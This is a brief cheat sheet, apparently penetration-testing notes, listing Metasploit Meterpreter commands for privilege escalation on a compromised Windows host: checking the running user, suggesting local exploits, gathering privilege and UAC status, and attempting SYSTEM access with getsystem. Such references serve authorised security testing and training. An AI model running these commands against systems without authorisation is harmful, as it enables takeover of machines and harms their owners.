## Meterpreter Privilige Escalation

```meterpreter> getuid```

Display the user that the Meterpreter server is running as on the host

```meterpreter> use post/multi/recon/local_exploit_suggester```

This module suggests local meterpreter exploits that can be used

```meterpreter> use post/windows/gather/win_privs```

This module will print if UAC is enabled, and if the current account is ADMIN enabled. It will also print UID,foreground SESSION ID, is SYSTEM status and current process PRIVILEGES

```meterpreter> getsystem```

Attempt to get system privs on Windows system
